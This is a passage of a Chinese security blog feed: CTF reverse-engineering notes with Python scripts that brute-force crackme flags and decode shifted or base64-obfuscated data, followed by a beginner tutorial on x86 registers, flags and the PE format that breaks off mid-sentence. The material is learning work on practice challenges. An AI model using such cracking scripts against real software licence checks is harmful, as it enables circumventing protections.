class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line">import subprocess</div><div class="line">import threading</div><div class="line"></div><div class="line">serial=<span class="string">'78767-77666-76786-87788-77778-66867-66777-86767-66877-77778-88887'</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line"><span class="string">##得到flag的字典</span></div><div class="line"><span class="string">dic = '</span>_qwertyuiopasdfghjklzxcvbnm<span class="string">'</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">name = []</span></div><div class="line"><span class="string">with open('</span>dic.txt<span class="string">','</span>w<span class="string">') as f:</span></div><div class="line"><span class="string">    for i in dic:</span></div><div class="line"><span class="string">        for j in dic:</span></div><div class="line"><span class="string">            for k in dic:</span></div><div class="line"><span class="string">                for l in dic:</span></div><div class="line"><span class="string">                    f.writelines('</span>&#123;hdu<span class="string">'+i+'</span>b<span class="string">'+j+k+l+'</span>0_&#125;\n<span class="string">')</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">'</span><span class="string">''</span></div><div class="line">def crack(<span class="built_in">source</span>):</div><div class="line">    p = subprocess.Popen(pname, stdin=subprocess.PIPE, stdout=subprocess.PIPE)</div><div class="line">    result = p.communicate(input=<span class="built_in">source</span>)</div><div class="line">    res=result[0]</div><div class="line">    <span class="keyword">if</span> (<span class="string">'Sorry'</span> <span class="keyword">in</span> res):</div><div class="line">        <span class="built_in">return</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">print</span> <span class="built_in">source</span></div><div class="line">        <span class="built_in">exit</span>()</div><div class="line"></div><div class="line">dic = []</div><div class="line"></div><div class="line">with open(<span class="string">'dic.txt'</span>, <span class="string">'r'</span>) as f:</div><div class="line">    <span class="keyword">for</span> eachline <span class="keyword">in</span> f.readlines():</div><div class="line">        dic.append(eachline)</div><div class="line"></div><div class="line"><span class="comment">##pname = 'myproject1.exe'</span></div><div class="line">pname = <span class="string">'crackme.exe'</span></div><div class="line"><span class="comment">##a = '123'+' '+'123'</span></div><div class="line">threads = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</div><div class="line">    <span class="built_in">source</span> = i + <span class="string">' '</span> + serial</div><div class="line">    t = threading.Thread(target = crack, args=(<span class="built_in">source</span>,))</div><div class="line">    threads.append(t)</div><div class="line"></div><div class="line">num = 0</div><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</div><div class="line">    t.start()</div><div class="line">    <span class="keyword">while</span> True:</div><div class="line">        <span class="comment">#判断正在运行的线程数量,如果小于5则退出while循环,</span></div><div class="line">        <span class="comment">#进入for循环启动新的进程.否则就一直在while循环进入死循环</span></div><div class="line">        <span class="keyword">if</span>(len(threading.enumerate()) &lt; 20):</div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure></p><h2 id="移位密码爆破"><a href="#移位密码爆破" class="headerlink" title="移位密码爆破"></a>移位密码爆破</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line">list1 = []</div><div class="line">s = <span class="string">"d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd"</span></div><div class="line"></div><div class="line">result = <span class="string">"0x"</span> + re.sub(r<span class="string">"(?&lt;=\w)(?=(?:\w\w)+$)"</span>, <span class="string">"0x"</span>, s)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i in range(len(result)):</div><div class="line">    <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>:</div><div class="line">        list1.append(result[(i - <span class="number">3</span>):(i + <span class="number">1</span>)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> j in range(<span class="number">129</span>):</div><div class="line">    l=[]</div><div class="line">    <span class="keyword">for</span> i in range(len(list1)):</div><div class="line">        l.append(chr(<span class="keyword">int</span>(list1[i],<span class="number">16</span>) - j))</div><div class="line">    k=''.join(l)</div><div class="line">    <span class="keyword">if</span> <span class="string">"DDCTF"</span> in k:</div><div class="line">        print k</div><div class="line">        print j</div><div class="line">    <span class="keyword">if</span> <span class="string">"ddctf"</span> in k:</div><div class="line">        print k</div><div class="line">        print j</div></pre></td></tr></table></figure><h1 id="某秋的比赛"><a href="#某秋的比赛" class="headerlink" title="某秋的比赛"></a>某秋的比赛</h1><p>打ctf，怀疑自己到疯，代码不会写，这里记录一下，以后方便用到</p><h2 id="1、花指令"><a href="#1、花指令" class="headerlink" title="1、花指令"></a>1、花指令</h2><p>6789abcd –&gt; 3637383961626364 -&gt;6789abcd<br><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p><p>b=’66778899’  –&gt; [0x66,0x77,0x88,0x99]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">def fen(b):</div><div class="line">    k = len(b)</div><div class="line">    n=[]</div><div class="line">    for i in range(len(b)-6):</div><div class="line">        if i%6==0:</div><div class="line">            n.append(b[i]+b[i+1])</div><div class="line">            n.append(b[i+2]+b[i+3])</div><div class="line">            n.append(b[i+4]+b[i+5])</div><div class="line">            i = i + 6</div><div class="line">    n.append(b[k - 6] + b[k - 5])</div><div class="line">    n.append(b[k - 4] + b[k - 3])</div><div class="line">    n.append(b[k - 2] + b[k - 1])</div><div class="line"></div><div class="line">    k = []</div><div class="line">    for i in range(len(n)):</div><div class="line">        k.append(hex(int(n[i], 16)))</div><div class="line">    return k</div></pre></td></tr></table></figure></p><p>最后附上，自己的juckcode.代码<br>思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">flag + base64</div><div class="line">k=flag+0x40 +base64</div><div class="line">flag=(k*7)%256</div><div class="line">flag=(flag+0x40) *7)%256</div><div class="line">算法1</div><div class="line">ZpYA           mqmA             9+LC</div><div class="line">大写-0x41</div><div class="line">小写-0x47</div><div class="line">数字+0x4</div><div class="line">+   0x13            </div><div class="line">7a z 61 a 33-1a</div><div class="line">5a Z 40 A 19-00</div><div class="line">shuz  0-9 34-3d</div><div class="line">3e        3e-13     </div><div class="line">算法2</div><div class="line">第一位 </div><div class="line">第二位</div><div class="line">第三位</div><div class="line">a1=0x2c</div><div class="line">a2=0x30</div><div class="line">a3=0x2c</div><div class="line">a4=0</div><div class="line">a1=0x19</div><div class="line">a2=0x29</div><div class="line">a3=0x18</div><div class="line">a4=0</div><div class="line">k=a1*4+(a2&amp;0x30)/16</div><div class="line">print k</div><div class="line">k=(a3&amp;0x3c)/4+(a2&amp;0x0f)*16</div><div class="line">print k</div><div class="line">k=((a3&amp;0x03)*2**6)%256+a4</div><div class="line">print k</div></pre></td></tr></table></figure></p><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line">import base64</div><div class="line">#分解flag_enc</div><div class="line">c1=[]</div><div class="line"># def fen():</div><div class="line">#     a = &apos;FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@&apos;</div><div class="line">#     for i in a:</div><div class="line">#         c.append(chr(ord(i) - 16))</div><div class="line">#     b = &quot;&quot;.join(c)</div><div class="line">#     k = len(b)</div><div class="line">#     print b</div><div class="line">#     for i in range(len(b)-6):</div><div class="line">#         if i%6==0:</div><div class="line">#             n.append(b[i]+b[i+1])</div><div class="line">#             n.append(b[i+2]+b[i+3])</div><div class="line">#             n.append(b[i+4]+b[i+5])</div><div class="line">#             i = i + 6</div><div class="line">#     n.append(b[k - 6] + b[k - 5])</div><div class="line">#     n.append(b[k - 4] + b[k - 3])</div><div class="line">#     n.append(b[k - 2] + b[k - 1])</div><div class="line">#</div><div class="line">#     print n</div><div class="line">#匹配字符</div><div class="line">def bp():</div><div class="line">    # n=[&apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;a9&apos;, &apos;80&apos;, &apos;c7&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;86&apos;, &apos;18&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;b6&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;aa&apos;, &apos;a8&apos;, &apos;80&apos;, &apos;76&apos;, &apos;de&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;ae&apos;, &apos;b8&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;be&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;18&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;62&apos;, &apos;8e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;14&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;b6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;be&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;04&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;7a&apos;, &apos;ee&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;d7&apos;, &apos;58&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;24&apos;, &apos;a2&apos;, &apos;c2&apos;, &apos;96&apos;, &apos;58&apos;, &apos;80&apos;, &apos;76&apos;, &apos;d6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;40&apos;, &apos;cb&apos;, &apos;28&apos;, &apos;80&apos;, &apos;72&apos;, &apos;ce&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;96&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;d3&apos;, &apos;42&apos;, &apos;00&apos;]</div><div class="line">    # k=len(n)</div><div class="line">    # print k</div><div class="line">    # for i in range(len(n)-3):</div><div class="line">    #     if i % 3 == 0:</div><div class="line">    #         k1=int(n[i], 16)</div><div class="line">    #         k2=int(n[i+1], 16)</div><div class="line">    #         k3=int(n[i+2], 16)</div><div class="line">    #         print i,hex(k1),hex(k2),hex(k3)</div><div class="line">    #         bp1(k1, k2, k3)</div><div class="line">    #</div><div class="line">    # k1 = int(int(n[k-3], 16))</div><div class="line">    # k2 = int(int(n[k-2], 16))</div><div class="line">    # k3 = int(int(n[k-1], 16))</div><div class="line">    # bp1(k1, k2, k3)</div><div class="line"></div><div class="line">    q=[]</div><div class="line">    c1=[90, 109, 120, 104, 90, 51, 116, 113, 100, 87, 78, 114, 88, 50, 78, 118, 90, 71, 86, 102, 89, 50, 70, 117, 98, 109, 48, 88, 51, 78, 48, 98, 51, 66, 102, 101, 87, 49, 88, 51, 74, 108, 100, 109, 86, 121, 99, 50, 108, 117, 90, 51, 48]</div><div class="line">    print c1</div><div class="line">    for i in range(len(c1)):</div><div class="line">        q.append(chr(c1[i]))</div><div class="line">    print &quot;&quot;.join(q)</div><div class="line"></div><div class="line">def bp1(k1,k2,k3):</div><div class="line">    begin = 0x2f - 0x41</div><div class="line">    end = 0x7a - 0x41</div><div class="line">    ll = 0</div><div class="line">    for a1 in range(begin, end):</div><div class="line">        if ll == 1:</div><div class="line">            break;</div><div class="line">        for a2 in range(begin, end):</div><div class="line">            if ll == 1:</div><div class="line">                break;</div><div class="line">            for a3 in range(begin, end):</div><div class="line">                if ll == 1:</div><div class="line">                    break;</div><div class="line">                for a4 in range(begin, end):</div><div class="line">                    if (a1 * 4 + (a2 &amp; 0x30) / 16 == k1) and ((a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16 == k2) and (</div><div class="line">                                        ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4 == k3):</div><div class="line">                        ll = 1</div><div class="line">                        k = int(hex(a1), 16)</div><div class="line">                        k=pandun(k)</div><div class="line">                        print chr(k)</div><div class="line">                        c1.append(chr(k))</div><div class="line">                        break;</div><div class="line">def pandun(x1):</div><div class="line">    if (x1&gt;=0)and(x1&lt;=0x19):</div><div class="line">        x1=int(x1)+0x41</div><div class="line">    elif (x1&gt;=0x1a)and(x1&lt;=0x33):</div><div class="line">        x1 = int(x1) + 0x47</div><div class="line">    elif (x1&gt;=0x34)and(x1&lt;=0x3d):</div><div class="line">        x1=int(x1)-0x4</div><div class="line">    else:</div><div class="line">        x1=int(x1)-0x13</div><div class="line">    return x1</div><div class="line">def test():</div><div class="line">    a1 = 0x2c</div><div class="line">    a2 = 0x30</div><div class="line">    a3 = 0x2c</div><div class="line">    a4 = 0</div><div class="line">    k = a1 * 4 + (a2 &amp; 0x30) / 16</div><div class="line">    print hex(k)</div><div class="line">    k = (a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16</div><div class="line">    print hex(k)</div><div class="line">    k = ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4</div><div class="line">    print hex(k)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    bp()</div></pre></td></tr></table></figure></p><p>这里我是od一步一步分析的，还是耐心不够<br>后来看师傅们的，发现都用爆破，这。。。。。(怪我代码能力弱了)<br>还有一个可以看反编译？这很奇怪（原来是有花指令，导致ida不能反编译成伪代码)<br>后来下来自己下来od手动去除伪代码（没有用的单字节去掉，不过伪代码有些东西类型，这只是一种）,可以f5后，也是要看大量的代码，佩服师傅们的能力，自己觉得od和ida结合是最好的<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flahd5iz10j30hf0iuglv.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flahdhlfxkj30iq0inwem.jpg" alt=""><br>这里也附上师傅们的wp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">import string</div><div class="line">import base64</div><div class="line">data = file(&apos;flag.enc&apos;).read().strip()</div><div class="line">data1 = &apos;&apos;</div><div class="line">for i in data:</div><div class="line">    data1 += chr(ord(i)-0x10)</div><div class="line">data1 = data1.decode(&apos;hex&apos;)</div><div class="line">bd = base64.b64encode(data1)</div><div class="line">t1 = string.uppercase+string.lowercase+string.digits+r&apos;+/&apos;</div><div class="line">t2=&apos;&apos;</div><div class="line">for i in t1:</div><div class="line">    t2 += chr(ord(i)-10)</div><div class="line">table1 = string.maketrans(t1,t2)</div><div class="line">table2 = string.maketrans(t2,t1)</div><div class="line">bd1 = bd.translate(table1)</div><div class="line">s=&apos;&apos;</div><div class="line">for i in range(len(bd1)/4):</div><div class="line">    s += bd1[4*i]</div><div class="line">bd2 = s.translate(table2)</div><div class="line">n = 3-len(bd2)%3</div><div class="line">bd2 += &apos;=&apos;*n</div><div class="line">print base64.b64decode(bd2)</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;爆破最好的解决方法，z3 求解器是什么？&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_开始到开始</title>
    <link href="http://yoursite.com/2018/03/01/re_1_ctf_start/"/>
    <id>http://yoursite.com/2018/03/01/re_1_ctf_start/</id>
    <published>2018-03-01T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:10.795Z</updated>
    
    <content type="html"><![CDATA[<p>RE的一些基础,逆向题目，需要大胆猜测。接下来就是小心验证。<br><a id="more"></a></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RE是逆向工程的简称（自己认为而已），逆向工程（又称逆向技术），是一种产品设计技术再现过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能特性及技术规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是在不能轻易获得必要的生产信息的情况下，直接从成品分析，推导出产品的设计原理。</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>1、IDA<br>2、Ollydbg<br>3、PEID</p><h1 id="逆向工程入门学习（转载）"><a href="#逆向工程入门学习（转载）" class="headerlink" title="逆向工程入门学习（转载）"></a>逆向工程入门学习（转载）</h1><p>汇编是逆向工程的基础，这篇文章讲解并不深入但是覆盖了你刚开始学习汇编需要了解的所有基础知识！汇编语言是一切程序的起点和终点，毕竟所有的高级语言都是建立在汇编基础之上的。在许多高级语言中我们都需要相对明确的语法，但是在汇编中，我们会使用一些单词缩写和数字来表达程序。</p><h2 id="I"><a href="#I" class="headerlink" title="I."></a>I.</h2><p> 单元、位和字节<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> ·BIT（位） - 电脑数据量的最小单元，可以是0或者1。</div><div class="line">例：00000001 = 1；00000010 = 2；00000011 = 3     </div><div class="line">·BYTE（字节） - 一个字节包含8个位，所以一个字节最大值是255(0-255)。为了方便阅读，我们通常使用16进制来表示。</div><div class="line">·WORD（字） - 一个字由两个字节组成，共有16位。一个字的最大值是0FFFFh (或者是 65535d) (h代表16进制，d代表10进制)。</div><div class="line">·DOUBLE WORD（双字DWORD） - 一个双字包含两个字，共有32位。最大值为0FFFFFFFF (或者是 4294967295d)。</div><div class="line">·KILOBYTE（千字） - 千字节并不是1000个字节，而是1024 (32*32) 个字节。</div><div class="line">·MEGABYTE - 兆字节同样也不是一兆个字节，而是1024*1024=1,048,576 个字节</div></pre></td></tr></table></figure></p><h2 id="II"><a href="#II" class="headerlink" title="II."></a>II.</h2><p> 寄存器</p><p>寄存器是计算机储存数据的“特别地方”。你可以把寄存器看作一个小盒子，我们可以在里面放很多东西：比如名字、数字、一段话……<br>如今Win+Intel CPU组成的计算机通常有9个32位寄存器 (w/o 标志寄存器)。它们是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">EAX： 累加器</div><div class="line">EBX： 基址寄存器</div><div class="line">ECX： 计数器</div><div class="line">EDX： 数据寄存器</div><div class="line">ESI： 源变址寄存器</div><div class="line">EDI： 目的变址寄存器</div><div class="line">EBP： 扩展基址指针寄存器</div><div class="line">ESP： 栈指针寄存器</div><div class="line">EIP： 指令指针寄存器</div></pre></td></tr></table></figure></p><p>通常来说寄存器大小都是32位 (四个字节) 。它们可以储存值为从0-FFFFFFFF (无符号)的数据。起初大部分寄存器的名字都暗示了它们的功能，比如ECX=计数，但是现在你可以使用任意寄存器进行计数 (只有在一些自定义的部分，计数才必须用到ECX)。当我用到EAX、EBX、ECX、EDX、ESI和EDI这些寄存器时我才会详细解释其功能，所以我们先讲EBP、ESP、EIP。<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EBP： EBP在栈中运用最广，刚开始没有什么需要特别注意的 ;) </div><div class="line">ESP： ESP指向栈区域的栈顶位置。栈是一个存放即将会被用到的数据的地方，你可以去搜索一下push/pop 指令了解更多栈知识。 </div><div class="line">EIP： EIP指向下一个将会被执行的指令。</div></pre></td></tr></table></figure></p><h2 id="III-标志寄存器"><a href="#III-标志寄存器" class="headerlink" title="III. 标志寄存器"></a>III. 标志寄存器</h2><p>标志寄存器代表某种状态。在32位CPU中有32个不同的标志寄存器，不过不用担心，我们只关心其中的3个：ZF、OF、CF。在逆向工程中，你了解了标志寄存器就能知道程序在这一步是否会跳转，标志寄存器就是一个标志，只能是0或者1，它们决定了是否要执行某个指令。</p><p>Z-Flag(零标志)：</p><p>ZF是破解中用得最多的寄存器(通常情况下占了90%)，它可以设成0或者1。若上一个运算结果为0，则其值为1，否则其值为0。(你可能会问为什么‘CMP’可以操作ZF寄存器，这是因为该指令在做比较操作(等于、不等于)，那什么时候结果是0什么时候是1呢？待会再说) </p><p>The O-Flag(溢出标志)：</p><p>OF寄存器在逆向工程中大概占了4%，当上一步操作改变了某寄存器的最高有效位时，OF寄存器会被设置成1。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了(你可以使用电脑自带计算器将这个16进制转化成2进制看看)。还有当上一步操作产生溢出时(即算术运算超出了有符号数的表示范围)，OF寄存器也会被设置成1。<br>The C-Flag(进位标志)：<br>进位寄存器的使用大概占了1%，如果产生了溢出，就会被设置成1。例，假如某寄存器值为FFFFFFFF，再加上1就会产生溢出，你可以用电脑自带的计算器尝试。</p><h2 id="IV-段偏移"><a href="#IV-段偏移" class="headerlink" title="IV. 段偏移"></a>IV. 段偏移</h2><p>内存中的一个段储存了指令(CS)、数据(DS)、堆栈(SS)或者其他段(ES)。每个段都有一个偏移量，在32位应用程序下，这些偏移量由 00000000 到 FFFFFFFF。段和偏移量的标准形式如下：</p><p><code>段：偏移量 = 把它们放在一起就是内存中一个具体的地址。</code></p><h2 id="VI-指令-字母表排序"><a href="#VI-指令-字母表排序" class="headerlink" title="VI. 指令 (字母表排序)"></a>VI. 指令 (字母表排序)</h2><p>请注意，所有的值通常是以16进制形式储存的。</p><p>大部分指令有两个操作符 (例如：add EAX, EBX)，有些是一个操作符 (例如：not EAX)，还有一些是三个操作符 (例如：IMUL EAX、EDX、64)。如果你使用 “DWORD PTR [XXX]”就表示使用了内存中偏移量为[XXX]的的数据。注意：字节在内存中储存方式是倒过来的(Win+Intel的电脑上大部分采用”小端法”，<br> WORD PTR <a href="双字节">XXX</a>和 BYTE PTR <a href="单字节">XXX</a>也都遵循这一规定)。 </p><p>大部分有两个操作符的指令都是以下这些形式（以add指令举例）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">add eax,ebx                          ;; 寄存器, 寄存器</div><div class="line">add eax,123                          ;; 寄存器, 数值</div><div class="line">add eax,dword ptr [404000]           ;; 寄存器, Dword  指针 [数值]</div><div class="line">add eax,dword ptr [eax]              ;; 寄存器, Dword  指针 [寄存器值]</div><div class="line">add eax,dword ptr [eax+00404000]     ;; 寄存器, Dword  指针 [寄存器值+数值]</div><div class="line">add dword ptr [404000],eax           ;; Dword 指针[数值], 寄存器</div><div class="line">add dword ptr [404000],123           ;; Dword 指针[数值], 数值</div><div class="line">add dword ptr [eax],eax              ;; Dword 指针[寄存器值], 寄存器</div><div class="line">add dword ptr [eax],123              ;; Dword 指针[寄存器值], 数值</div><div class="line">add dword ptr [eax+404000],eax       ;; Dword 指针[寄存器值+数值], 寄存器</div><div class="line">add dword ptr [eax+404000],123       ;; Dword 指针[寄存器值+数值], 数值</div></pre></td></tr></table></figure></p><h2 id="深入的必经之路"><a href="#深入的必经之路" class="headerlink" title="深入的必经之路"></a>深入的必经之路</h2><p>PE（Portable Executable）文件简介<br>PE（Portable Executable）文件是Windows操作系统下使用的可执行文件格式。它是微软在UNIX平台的COFF（通用对象文件格式）基础上制作而成。最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在Windows系列操作系统下。<br>PE文件是指32位可执行文件，也称为PE32。64位的可执行文件称为PE+或PE32+,是PE(PE32)的一种扩展形式（请注意不是PE64)。<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkd7ylncezj30e50k4ta1.jpg" alt=""><br>PE文件结构一般如上图所示。<br>当一个PE文件被执行时，PE装载器首先检查DOS header里的PE header的偏移量。如果找到，则直接跳转到PE header的位置。</p><p>当PE装载器跳转到PE header后，第二步要做的就是检查PE header是否有效。如果该PE header有效，就跳转到PE header的尾部。</p><p>紧跟PE 